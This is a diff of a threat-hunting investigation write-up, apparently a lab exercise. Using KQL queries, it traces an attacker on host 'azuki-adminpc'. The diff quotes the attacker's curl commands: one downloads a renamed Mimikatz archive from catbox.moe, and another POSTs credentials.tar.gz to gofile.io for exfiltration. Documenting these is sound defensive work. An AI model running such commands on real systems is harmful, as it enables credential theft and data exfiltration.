@@ -356,47 +356,49 @@ DeviceProcessEvents
 
 ---
 
-### 18. XXXXX
+### 18. Exfiltration: Data Upload & Cloud Storage Service
 
-Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
-
-**Query used to locate events:**
-
-```kql
-DeviceProcessEvents
-| where TimeGenerated >= datetime(2025-11-19)
-| where DeviceName == "azuki-adminpc"
-| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
-| project TimeGenerated, ProcessCommandLine
-| order by TimeGenerated asc
-
-```
-<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
-
----
-
-### 19. XXXXXX
-
-Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+Searched for evidence of data exfiltration and discovered the HTTP POST command used to upload stolen data archives to cloud storage. The attacker executed the following curl with form-based POST upload command to exfiltrate the first archive (credentials.tar.gz) to gofile.io: "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile. This command pattern was repeated for all the other archives. The exfiltration service domain (i.e., gofile.io), is an anonymous cloud storage service that provides temporary file hosting with self-destructing links. It is commonly used for malware distribution and data exfiltration due to no registration requirement and high-speed transfers.
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated >= datetime(2025-11-19)
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
 | where DeviceName == "azuki-adminpc"
-| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
+| where ProcessCommandLine has "curl" and ProcessCommandLine has "POST"
 | project TimeGenerated, ProcessCommandLine
 | order by TimeGenerated asc
 
 ```
-<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
+<img width="1845" height="670" alt="BT_Q22" src="https://github.com/user-attachments/assets/2dfd2e58-38cf-49b1-b06a-7aa43b7f2cb4" />
 
 ---
 
-### 20. XXXXX
+### 19. Exfiltration: Destination Server
 
-Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+Searched for the exfiltration server IP address and discovered that the server IP that received the stolen data was 45.112.123.227. This IP address corresponds to gofile.io's upload infrastructure.
+
+**Query used to locate events:**
+
+```kql
+DeviceNetworkEvents
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where RemoteUrl has "gofile.io"
+| project TimeGenerated, RemoteUrl, RemoteIP
+| order by TimeGenerated asc
+
+```
+<img width="1841" height="277" alt="BT_Q23" src="https://github.com/user-attachments/assets/e74a14f2-56ba-4fe7-92c5-6c924d75974c" />
+
+---
+
+### 20. Credential Access: Master Password Extraction
+
+Searched for evidence of... 
+
+credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
 
 **Query used to locate events:**
 
